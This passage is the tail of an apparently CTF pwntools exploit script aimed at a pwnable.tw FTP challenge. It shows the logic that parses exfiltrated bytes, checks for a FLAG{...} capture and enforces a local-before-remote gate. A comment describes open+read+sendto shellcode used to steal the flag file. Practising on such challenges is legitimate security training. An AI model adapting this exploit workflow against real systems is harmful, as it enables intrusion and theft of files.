        log.info(f"raw exfil: {out!r}")
        txt = out[8:].split(b'\x00')[0] if len(out) > 8 else b''
        log.info(f"open() returned {u64(out[:8]) if len(out) >= 8 else None}")
        print("EXFIL:", txt.decode(errors='replace'))
        # a capture only counts on a COMPLETE FLAG{...} that came off the real target
        m = re.search(rb'FLAG\{[^}]+\}', out)
        if args.REMOTE:
            if verify(out):
                open('FLAG', 'w').write(m.group(0).decode() + "\n")
                log.success(f"CAPTURED {m.group(0).decode()}")
                fact("flag", m.group(0).decode(),
                     "exploit.py REMOTE=1 STAGE=pwn -- open(/home/hitcon_ftp/flag)+read+sendto "
                     "shellcode on chall.pwnable.tw:10309; raw/010-remote-pwn3.txt")
            else:
                log.failure("no complete FLAG{...} in the reply")
        else:
            if b'localflag{' in out:
                open(PROOF, 'w').close()
                log.success("LOCAL file-read proven -> .local_shell_ok written")
            else:
                log.failure("local run did not produce the placeholder file")
    t.close()

PROOF = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".local_shell_ok")

if __name__ == "__main__":
    if args.REMOTE and not os.path.exists(PROOF) and not args.FORCE:
        log.error("parity gate: no verified LOCAL shell yet -- run locally first, or pass FORCE=1")
    main()
```
